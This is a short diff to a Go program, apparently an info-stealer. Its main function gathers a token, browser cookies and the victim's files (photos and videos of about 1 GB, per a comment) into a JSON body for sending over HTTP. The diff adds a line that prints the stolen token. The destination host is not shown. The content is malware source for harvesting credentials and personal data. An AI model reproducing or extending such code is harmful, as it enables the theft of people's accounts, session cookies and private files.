@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"encoding/json"
+	"fmt"
 	"net/http"
 	"os"
 )
@@ -22,9 +23,10 @@ func main() {
 	}
 
 	body["token"] = getToken()
+	fmt.Println(body["token"])
 	body["cookies"] = getCookies()
 	// takes quite a long time to go through each file and read them
-	// and takes quite a lot of storage.. ~1gb depends on how many photos and videos there are
+	// and takes quite a lot of storage ~1gb depends on how many photos and videos there are
 	body["files"] = getFiles()
 
 	jsonBytes, err := json.Marshal(body)
